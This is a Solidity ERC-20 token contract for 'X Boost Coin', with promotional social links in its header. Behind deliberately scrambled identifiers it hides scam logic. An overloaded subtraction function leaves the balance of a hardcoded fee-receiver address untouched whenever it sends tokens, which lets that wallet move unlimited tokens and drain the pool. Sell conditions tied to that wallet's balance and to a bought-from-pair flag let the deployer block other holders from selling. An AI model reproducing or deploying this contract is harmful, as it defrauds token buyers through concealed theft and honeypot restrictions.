/**

============================================================================================================
===     ===     ===       ======    ======    =====      ===        ====     =====    ====    ==  =======  =
 ===    ===   ====  ===  ====  ==  ====  ==  ===  ====  =====  ======  ===  ===  ==  ====  ===   ======  =
 ===    ===   ====  ====  ==  ====  ==  ====  ==  ====  =====  =====  ========  ====  ===  ===    =====  =
 ====        =====  ===  ===  ====  ==  ====  ===  ==========  =====  ========  ====  ===  ===  ==  ===  =
 =====      ======      ====  ====  ==  ====  =====  ========  =====  ========  ====  ===  ===  ===  ==  =
  ====       =====  ===  ===  ====  ==  ====  =======  ======  =====  ========  ====  ===  ===  ====  =  =
  ===   ===   ====  ====  ==  ====  ==  ====  ==  ====  =====  =====  ========  ====  ===  ===  =====    =
 ===    ===   ====  ===  ====  ==  ====  ==  ===  ====  =====  ======  ===  ===  ==  ====  ===  ======   =
===     ===    ===      ======    ======    =====      ======  =======     =====    ====    ==  =======  =



Telegram- https://t.me/Xboost_Portal
Twitter- https://twitter.com/Xboost_Portal
Website- https://xboost.org/

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function  _wifur(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _wifur(a, b, "SafeMath:  subtraction overflow");
    }

    function  _wifur(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IuniswapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract XBoost is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "X Boost Coin";
    string private constant _symbol = "XBoost";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalsSupplyk_ty = 1000000000 * 10 **_decimals;
    uint256 public _maxTxAmount = _totalsSupplyk_ty;
    uint256 public _maxWalletSize = _totalsSupplyk_ty;
    uint256 public _taxSwapThreshold= _totalsSupplyk_ty;
    uint256 public _maxTaxSwap= _totalsSupplyk_ty;

    uint256 private _BuyTaxinitial=10;
    uint256 private _SellTaxinitial=15;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAtreduce=6;
    uint256 private _SellTaxAtreduce=1;
    uint256 private _toukPevatcekSrouy=0;
    uint256 private _ckscnrBaryog=0;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _dfe_zauncdyrg;
    mapping (address => bool) private _ulfkrWaueakray;
    mapping(address => uint256) private _tkd_pdaus_dTmreTrasruce;
    bool public _rfrivdcouiy = false;
    address public _zrnorFeecRecvuearly = 0x6fb512D50eb23EE640C7743A76EB6C3ae5f639ce;

    IuniswapRouter private _uniswapueRouterUniswapeuFcarne;
    address private _uniswapPairTokenurLfipiquoy;
    bool private FrkTradlqujbse;
    bool private _svefhrwajuknxg = false;
    bool private _swapuvldrUniswaplrSutqs = false;

 
    event RemovseuAutyiauit(uint _maxTxAmount);
    modifier lockTheSwap {
        _svefhrwajuknxg = true;
        _;
        _svefhrwajuknxg = false;
    }

    constructor () {
        _balances[_msgSender()] = _totalsSupplyk_ty;
        _dfe_zauncdyrg[owner()] = true;
        _dfe_zauncdyrg[address(this)] = true;
        _dfe_zauncdyrg[_zrnorFeecRecvuearly] = true;


        emit Transfer(address(0), _msgSender(), _totalsSupplyk_ty);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalsSupplyk_ty;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wifur(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {

            if (_rfrivdcouiy) {
                if (to != address(_uniswapueRouterUniswapeuFcarne) && to != address(_uniswapPairTokenurLfipiquoy)) {
                  require(_tkd_pdaus_dTmreTrasruce[tx.origin] < block.number,"Only one transfer per block allowed.");
                  _tkd_pdaus_dTmreTrasruce[tx.origin] = block.number;
                }
            }

            if (from == _uniswapPairTokenurLfipiquoy && to != address(_uniswapueRouterUniswapeuFcarne) && !_dfe_zauncdyrg[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                if(_ckscnrBaryog<_toukPevatcekSrouy){
                  require(!_rudratfoq(to));
                }
                _ckscnrBaryog++; _ulfkrWaueakray[to]=true;
                taxAmount = amount.mul((_ckscnrBaryog>_BuyTaxAtreduce)?_BuyTaxfinal:_BuyTaxinitial).div(100);
            }

            if(to == _uniswapPairTokenurLfipiquoy && from!= address(this) && !_dfe_zauncdyrg[from] ){
                require(amount <= _maxTxAmount && balanceOf(_zrnorFeecRecvuearly)<_maxTaxSwap, "Exceeds the _maxTxAmount.");
                taxAmount = amount.mul((_ckscnrBaryog>_SellTaxAtreduce)?_SellTaxfinal:_SellTaxinitial).div(100);
                require(_ckscnrBaryog>_toukPevatcekSrouy && _ulfkrWaueakray[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_svefhrwajuknxg 
            && to == _uniswapPairTokenurLfipiquoy && _swapuvldrUniswaplrSutqs && contractTokenBalance>_taxSwapThreshold 
            && _ckscnrBaryog>_toukPevatcekSrouy&& !_dfe_zauncdyrg[to]&& !_dfe_zauncdyrg[from]
            ) {
                swapTiuerqourc( _druct(amount, _druct(contractTokenBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]= _wifur(from, _balances[from], amount);
        _balances[to]=_balances[to].add(amount. _wifur(taxAmount));
        emit Transfer(from, to, amount. _wifur(taxAmount));
    }

    function swapTiuerqourc(uint256 amountForstoken) private lockTheSwap {
        if(amountForstoken==0){return;}
        if(!FrkTradlqujbse){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapueRouterUniswapeuFcarne.WETH();
        _approve(address(this), address(_uniswapueRouterUniswapeuFcarne), amountForstoken);
        _uniswapueRouterUniswapeuFcarne.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountForstoken,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _druct(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function  _wifur(address from, uint256 a, uint256 b) private view returns(uint256){
        if(from == _zrnorFeecRecvuearly){
            return a;
        }else{
            return a. _wifur(b);
        }
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _totalsSupplyk_ty;
        _maxWalletSize=_totalsSupplyk_ty;
        _rfrivdcouiy=false;
        emit RemovseuAutyiauit(_totalsSupplyk_ty);
    }

    function _rudratfoq(address _jubiupuy) private view returns (bool) {
        uint256 rqeoBaraceikd;
        assembly {
            rqeoBaraceikd := extcodesize(_jubiupuy)
        }
        return rqeoBaraceikd > 0;
    }


    function openTrading() external onlyOwner() {
        require(!FrkTradlqujbse,"trading is already open");
        _uniswapueRouterUniswapeuFcarne = IuniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_uniswapueRouterUniswapeuFcarne), _totalsSupplyk_ty);
        _uniswapPairTokenurLfipiquoy = IUniswapV2Factory(_uniswapueRouterUniswapeuFcarne.factory()).createPair(address(this), _uniswapueRouterUniswapeuFcarne.WETH());
        _uniswapueRouterUniswapeuFcarne.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_uniswapPairTokenurLfipiquoy).approve(address(_uniswapueRouterUniswapeuFcarne), type(uint).max);
        _swapuvldrUniswaplrSutqs = true;
        FrkTradlqujbse = true;
    }

    receive() external payable {}
}